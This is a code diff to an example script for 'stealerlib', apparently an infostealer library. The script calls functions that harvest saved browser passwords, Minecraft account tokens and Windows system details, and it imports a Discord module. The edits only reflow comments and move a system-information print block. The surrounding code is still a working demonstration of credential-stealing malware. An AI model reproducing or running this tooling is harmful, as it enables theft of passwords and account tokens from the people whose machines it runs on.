@@ -12,10 +12,11 @@ from stealerlib.browser import Browser
 from stealerlib.apps.discord import Discord
 from stealerlib.apps.minecraft import Minecraft
 
-conv = False # default on commands is True (browser.get_passwords())
-             # if True, functions will return a list of values
-             # as opposed to when False, where the functions will return
-             # an interactive StealerLib object
+            # default on commands is True (browser.get_passwords())
+conv = False
+            # if True, functions will return a list of values
+            # as opposed to when False, where the functions will return
+            # an interactive StealerLib object
 
             # Example on how to iterate through an object vs. list of values
 
@@ -75,12 +76,13 @@ if __name__ == '__main__':
     system.get_partitions(conv=conv)
     print('System Partitions:', system.partitions, '\n') # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
                                                          # conv=False -> [SystemTypes.Partition, ...]
-    
-    print(system.comp_info,
-          system.os_info,
-          system.proc_info,
-          system.gpu_info)
 
     minecraft.get_accounts(conv=conv)
     print('Minecraft Accounts:', minecraft.accounts, '\n') # conv=True ->  [(email, username, uuid, token), ...]
                                                            # conv=False -> [MinecraftTypes.Account, ...]
+    
+    # windows specific system information grabber
+    print(system.comp_info,
+          system.os_info,
+          system.proc_info,
+          system.gpu_info)
